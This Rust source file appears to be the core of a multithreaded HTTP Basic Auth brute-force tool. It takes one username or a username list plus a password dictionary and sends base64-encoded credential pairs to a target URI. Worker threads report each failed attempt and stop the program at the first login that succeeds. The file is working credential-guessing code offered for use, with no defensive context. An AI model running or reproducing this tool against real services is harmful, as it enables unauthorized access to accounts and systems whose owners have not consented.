use crossbeam_channel::Receiver;

const MAX_NMUM_THREADS: &str = "MAX_NUM_THREADS";
const CHANNEL_BUFFER: &str = "CHANNEL_BUFFER";
const CHANNEL_BUFFER_DEF_VALUE: usize = 10000000;

use super::{
    connection::{http_req, BruteResponse},
    console::{print_error, print_help, print_result},
};
use std::{
    collections::HashMap,
    fs::File,
    io::{self, BufRead},
    path::Path,
    process,
    time::Instant,
};

pub fn execute_command(parsed_command: HashMap<String, String>) {
    let main = parsed_command.get("main");
    match main {
        Some(value) => match value.to_string().as_str() {
            "help" => print_help(),
            command => print_error(format!("Invalid command {}", command)),
        },
        _ => run_attack(parsed_command),
    }
}

fn run_attack(parsed_command: HashMap<String, String>) {
    let num_threads = load_env_variable_as_usize(MAX_NMUM_THREADS, num_cpus::get(), true);
    let channel_buffer = load_env_variable_as_usize(CHANNEL_BUFFER, CHANNEL_BUFFER_DEF_VALUE, true);
    println!("The channel buffer is {}", channel_buffer);
    let start = Instant::now();
    let uri = parsed_command.get("uri").unwrap();

    let dictionary_attack = check_username_and_passwords;

    rayon::scope(|s| {
        let (work_queue_sender, work_queue_receiver) = crossbeam_channel::bounded(channel_buffer);
        println!("I will use [ {} ] threads", num_threads);
        for task_counter in 0..num_threads {
            let work_receiver: Receiver<String> = work_queue_receiver.clone();

            s.spawn(move |_| {
                do_job(task_counter, uri.as_str(), &start, work_receiver);
            });
        }

        let filename_passwords = parsed_command.get("dictionary").unwrap();
        println!("Reading filename {}...", &filename_passwords);

        match parsed_command.get("usernames") {
            Some(path) => {
                if let Ok(usernames) = read_lines(path) {
                    for line in usernames {
                        if let Ok(username) = line {
                            dictionary_attack(
                                &work_queue_sender,
                                filename_passwords.as_str(),
                                &username,
                                num_threads,
                            );
                        }
                    }
                    drop(work_queue_sender);
                }
            }
            None => {
                let param_username = parsed_command.get("username").unwrap();
                dictionary_attack(
                    &work_queue_sender,
                    filename_passwords.as_str(),
                    &param_username,
                    num_threads,
                );
                drop(work_queue_sender);
                return ();
            }
        };
    });
}

fn check_username_and_passwords(
    work_queue_sender: &crossbeam_channel::Sender<String>,
    filename_passwords: &str,
    username: &str,
    num_threads: usize,
) {
    let mut i = 0;
    if let Ok(passwords) = read_lines(filename_passwords) {
        for line in passwords {
            if let Ok(password) = line {
                work_queue_sender
                    .send(format!("{}|{}", username, password))
                    .unwrap();
                i = (i + 1) % num_threads;
            }
        }
    }
}

fn load_env_variable_as_usize(
    var_name: &str,
    default_value: usize,
    greater_than_zero: bool,
) -> usize {
    match dotenv::var(var_name) {
        Ok(data) => {
            let value = data.parse::<usize>().unwrap();
            if greater_than_zero && value <= 0 {
                return default_value;
            }
            return value;
        }
        Err(_) => default_value,
    }
}

fn do_job(task_counter: usize, uri: &str, start: &Instant, work_receiver: Receiver<String>) {
    println!("thread {} initialized", &task_counter);
    loop {
        let tx_res = work_receiver.recv();

        match tx_res {
            Ok(tx) => {
                let separator_pos = tx.chars().position(|c| c == '|').unwrap();
                let username = &tx[0..separator_pos];
                let password = &tx[separator_pos + 1..];
                match attack_request(task_counter, &uri, username, password) {
                    Ok(_) => {
                        let duration = start.elapsed();
                        println!("duration: {:?}", duration);
                        process::exit(0x0100);
                    }
                    Err(_) => (),
                }
            }
            Err(err) => {
                println!("thread {} finished job: {}", &task_counter, err);
                break;
            }
        }
    }
}

fn attack_request(
    idx: usize,
    uri: &str,
    username: &str,
    password: &str,
) -> Result<BruteResponse, String> {
    let auth = base64::encode(format!("{}:{}", &username, &password));
    let status = http_req(uri, &auth, username, &password);
    if status.is_ok() {
        let result = status.unwrap();
        print_result(
            idx,
            &result.message,
            &result.uri,
            &result.username,
            &result.password,
            &result.base64,
        );
        return Ok(result);
    } else {
        println!(
            "[KO] -> thread: [{}], username: [{}], password: [{}]",
            idx + 1,
            &username,
            &password
        );
    }
    Err("No password found".to_string())
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}
